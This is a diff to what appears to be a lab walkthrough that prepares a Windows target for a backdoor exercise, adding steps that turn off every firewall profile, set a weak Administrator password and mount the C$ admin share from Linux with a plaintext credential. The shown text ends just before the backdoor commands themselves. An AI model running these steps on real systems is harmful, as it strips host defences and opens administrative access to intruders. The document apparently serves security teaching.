@@ -30,6 +30,30 @@ Please note the IP address of **your** Ethernet adapter.
 
 **Your IP Address and adapter name may be different.**
 
+Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
+
+<pre> netsh advfirewall set allprofiles state off</pre>
+
+Next, set a password for the Administrator account that you can remember
+
+<pre>net user Administrator password1234</pre>
+
+Please note, that is a very bad password.  Come up with something better. But, please remember it.
+
+Within the Command Prompt, please run the following command:
+
+<pre>ipconfig</pre>
+
+Please note your Windows IP address.
+
+We need to run the following commands in order to mount our remote system to the correct directory:
+
+<pre>sudo su -</pre>
+
+<pre>mount -t cifs //10.10.1.209/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh</pre>
+
+**REMEMBER - YOUR IP ADDRESS WILL LIKELY BE DIFFERENT.**
+
 Run the following commands to start a simple backdoor and backdoor listener: 
  
 <pre>sudo su -</pre>
